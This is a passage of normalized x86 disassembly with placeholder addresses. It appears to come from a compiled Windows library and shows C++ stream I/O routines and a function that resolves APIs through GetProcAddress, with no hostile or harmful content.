call sub_10003dc0
lea ecx [ eax + esi * 2 ]
xor eax eax
nop
add eax 0x2
cmp eax 0xa
jb r-xdata
mov dl [ ecx + 0x1 ]
cmp dl [ ebp + eax - 0xf ]
jne r-xdata
mov dl [ ecx ]
cmp dl [ ebp + eax - 0x10 ]
jne r-xdata
inc esi
cmp esi [ edi + 0x10 ]
jb r-xdata
movzx edx [ ebp + eax - 0x1c ]
mov [ ecx ] dl
movzx edx [ ebp + eax - 0x1b ]
mov [ ecx + 0x1 ] dl
sub_1000c940
push ebp
mov ebp esp
push 0xffffffff
push sub_10028e42
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] esi
cmp ecx edi
je r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + esi + 0xc ] edi
sete cl
mov [ ebp - 0x28 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + 0x4 ]
add eax esi
lea edi [ ebp - 0x1c ]
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_10007ca0
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
mov ecx eax
call sub_10003920
mov [ ebp - 0x4 ] 0x5
call j_sub_1001a4cd
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx [ ebp + 0xc ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x3
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + esi + 0x38 ]
mov edi [ edi ]
mov [ ebp - 0x24 ] 0x0
movzx ecx [ ecx + esi + 0x40 ]
push ebx
push ecx
mov ecx [ ebp - 0x14 ]
add eax esi
push eax
push edx
mov edx [ ebp - 0x24 ]
push edx
mov edx [ edi + 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
call edx
cmp [ ebp - 0x24 ] 0x0
mov edi 0x4
jne r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_100163b9
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_100064f0
push 0x0
call sub_100033b0
or eax 0x4
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov edi [ ebp - 0x18 ]
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_100163e1
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ ebx + 0x4 ] eax
sub_1000ca72
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_100033b0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_1000cb10
push ebp
mov ebp esp
push 0xffffffff
push sub_10028e02
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] esi
cmp ecx edi
je r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + esi + 0xc ] edi
sete cl
mov [ ebp - 0x28 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + 0x4 ]
add eax esi
lea edi [ ebp - 0x1c ]
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_10007ca0
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
mov ecx eax
call sub_10003920
mov [ ebp - 0x4 ] 0x5
call j_sub_1001a4cd
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
movzx ebx [ ebp + 0xc ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x3
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + esi + 0x38 ]
mov edi [ edi ]
mov [ ebp - 0x24 ] 0x0
movzx ecx [ ecx + esi + 0x40 ]
push ebx
push ecx
mov ecx [ ebp - 0x14 ]
add eax esi
push eax
push edx
mov edx [ ebp - 0x24 ]
push edx
mov edx [ edi + 0x18 ]
lea eax [ ebp - 0x24 ]
push eax
call edx
cmp [ ebp - 0x24 ] 0x0
mov edi 0x4
jne r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_100163b9
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_100064f0
push 0x0
call sub_100033b0
or eax 0x4
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov edi [ ebp - 0x18 ]
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_100163e1
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ ebx + 0x4 ] eax
sub_1000cc43
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_100033b0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_1000cce0
push ebp
mov ebp esp
push 0xffffffff
push sub_10028dc2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] esi
cmp ecx edi
je r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + esi + 0xc ] edi
sete cl
mov [ ebp - 0x28 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + 0x4 ]
add eax esi
lea edi [ ebp - 0x1c ]
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_10007ca0
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
mov ecx eax
call sub_10003920
mov [ ebp - 0x4 ] 0x5
call j_sub_1001a4cd
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ esi ]
mov ebx [ ebp + 0xc ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x3
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + esi + 0x38 ]
mov edi [ edi ]
mov [ ebp - 0x24 ] 0x0
movzx ecx [ ecx + esi + 0x40 ]
push ebx
push ecx
mov ecx [ ebp - 0x14 ]
add eax esi
push eax
push edx
mov edx [ ebp - 0x24 ]
push edx
mov edx [ edi + 0x1c ]
lea eax [ ebp - 0x24 ]
push eax
call edx
cmp [ ebp - 0x24 ] 0x0
mov edi 0x4
jne r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_100163b9
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_100064f0
push 0x0
call sub_100033b0
or eax 0x4
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov edi [ ebp - 0x18 ]
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_100163e1
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ ebx + 0x4 ] eax
sub_1000ce12
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_100033b0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_1000ceb0
push ebp
mov ebp esp
push 0xffffffff
push sub_10028d82
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] esi
cmp ecx edi
je r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + esi + 0xc ] edi
sete cl
mov [ ebp - 0x28 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + 0x4 ]
add eax esi
lea edi [ ebp - 0x1c ]
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_10007ca0
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
mov ecx eax
call sub_10003920
mov [ ebp - 0x4 ] 0x5
call j_sub_1001a4cd
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx [ ebp + 0xc ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x3
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + esi + 0x38 ]
mov edi [ edi ]
mov [ ebp - 0x24 ] 0x0
movzx ecx [ ecx + esi + 0x40 ]
push ebx
push ecx
mov ecx [ ebp - 0x14 ]
add eax esi
push eax
push edx
mov edx [ ebp - 0x24 ]
push edx
mov edx [ edi + 0x4 ]
lea eax [ ebp - 0x24 ]
push eax
call edx
cmp [ ebp - 0x24 ] 0x0
mov edi 0x4
jne r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_100163b9
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_100064f0
push 0x0
call sub_100033b0
or eax 0x4
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov edi [ ebp - 0x18 ]
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_100163e1
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ ebx + 0x4 ] eax
sub_1000cfe2
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_100033b0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_1000d080
push ebp
mov ebp esp
push 0xffffffff
push sub_10028d3a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x20 ] esi
cmp ecx edi
je r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0xc ] edi
sete cl
mov [ ebp - 0x1c ] cl
mov ebx 0x1
mov [ ebp - 0x4 ] ebx
test cl cl
jne r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov ecx [ eax + esi + 0x38 ]
mov edx [ ecx + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
lea edi [ ebx + 0x3 ]
jmp r-xdata
mov ecx eax
call sub_10003920
mov eax [ ecx ]
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push edx
call eax
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov edi 0x4
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x8 ]
mov [ eax ] cx
movzx eax cx
jmp r-xdata
mov [ ebp - 0x4 ] 0x4
call j_sub_1001a4cd
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_100064f0
push 0x0
call sub_100033b0
or eax 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
sub_1000d15d
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x1
push ebx
call sub_100033b0
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or eax 0x4
sub_1000d200
push ebp
mov ebp esp
push 0xffffffff
push sub_1002912f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ edi ] r--data
mov [ edi + 0x50 ] r--data
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov edx [ edi ]
mov esi [ edx + 0x4 ]
add esi edi
mov [ ebp - 0x10 ] 0x1
call sub_100034f0
lea ebx [ edi + 0x4 ]
push esi
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] 0x0
call sub_10004be0
cmp [ esi + 0x38 ] 0x0
mov [ esi + 0x40 ] ax
jne r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
push ebx
mov [ edi + ecx ] r--data
call sub_10004a00
mov [ ebx ] r--data
mov [ ebx + 0x3c ] 0x0
mov [ ebx + 0x40 ] 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0xc ]
or eax 0x4
or eax 0x4
push 0x0
mov ecx esi
call sub_100033b0
sub_1000d300
push ebp
mov ebp esp
push 0xffffffff
push sub_10028a2b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea edi [ ecx - 0x50 ]
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
lea esi [ edi + 0x50 ]
mov [ ebp - 0x10 ] esi
mov [ ecx + esi - 0x50 ] r--data
lea ecx [ esi - 0x4c ]
mov [ ebp - 0x4 ] 0x0
call sub_10003fa0
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ esi - 0x50 ]
mov eax [ edx + 0x4 ]
mov [ eax + esi - 0x50 ] r--data
push esi
mov [ esi ] r--data
call sub_10015fc5
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push edi
call sub_100173b1
add esp 0x4
sub_1000d3a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10028cfa
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ esi ]
mov edi [ eax + 0x10 ]
mov eax [ ecx + 0x4 ]
mov edx [ eax + esi + 0x24 ]
mov ecx [ eax + esi + 0x20 ]
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1c ] edi
test edx edx
jl r-xdata
mov [ ebp - 0x14 ] 0x0
jg r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] edx
cmp ecx edi
jbe r-xdata
test ecx ecx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0xc ] edi
sete cl
mov [ ebp - 0x24 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
jne r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
sub ecx edi
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ eax + esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov ebx 0x4
jmp r-xdata
mov ecx eax
call sub_10003920
mov eax [ eax + esi + 0x38 ]
xor edi edi
mov [ ebp - 0x28 ] esi
cmp eax edi
je r-xdata
mov ebx [ ebp - 0x18 ]
lea ecx [ ecx ]
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
mov edx [ ecx ]
push edi
push [ ebp - 0x1c ]
push eax
mov eax [ edx + 0x24 ]
call eax
cmp eax [ ebp - 0x1c ]
jne r-xdata
mov eax [ eax ]
mov ebx [ ebp - 0x18 ]
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
movzx edx [ eax + esi + 0x40 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] edi
je r-xdata
mov [ ebp - 0x4 ] 0x4
call j_sub_1001a4cd
mov edi [ ebp - 0x28 ]
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
cmp edx edi
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x8
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] edi
jle r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + edi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_100064f0
push 0x0
call sub_100033b0
or eax 0x4
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ecx ecx
mov [ eax + esi + 0x20 ] ecx
mov [ eax + esi + 0x24 ] ecx
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
movzx edx [ eax + esi + 0x40 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
dec [ ebp - 0x14 ]
jmp r-xdata
mov ebx [ ebp - 0x18 ]
or ebx 0x4
mov [ ebp - 0x18 ] ebx
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea ebx [ eax + 0x2 ]
mov [ ecx ] ebx
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
cmp [ ebp - 0x14 ] edi
jbe r-xdata
cmp ebx edi
je r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
dec [ ebp - 0x14 ]
jmp r-xdata
or ebx 0x4
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edi [ eax + 0x2 ]
mov [ ecx ] edi
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_1000d5f7
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_100033b0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_1000d630
cmp [ rw-data ] 0x0
je r-xdata
push esi
push r--data
call [ GetModuleHandleW@IAT ]
mov esi eax
test esi esi
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
pop esi
je r-xdata
push edi
mov edi [ GetProcAddress@IAT ]
push r--data
push esi
call edi
push r--data
push esi
mov [ rw-data ] eax
call edi
push r--data
push esi
mov [ rw-data ] eax
call edi
push r--data
push esi
mov [ rw-data ] eax
call edi
mov [ rw-data ] eax
pop edi
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
retn
getSECFunctions
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x9c
push ebx
push esi
push edi
lea eax [ esp + 0x10 ]
push eax
call sub_1000d200
call sub_1000d630
test al al
mov eax r--data
jne r-xdata
push eax
push ecx
lea ecx [ esp + 0x18 ]
push r--data
push ecx
call sub_100076f0
add esp 0xc
push eax
call sub_100076f0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov bl 0x6
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax r--data
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
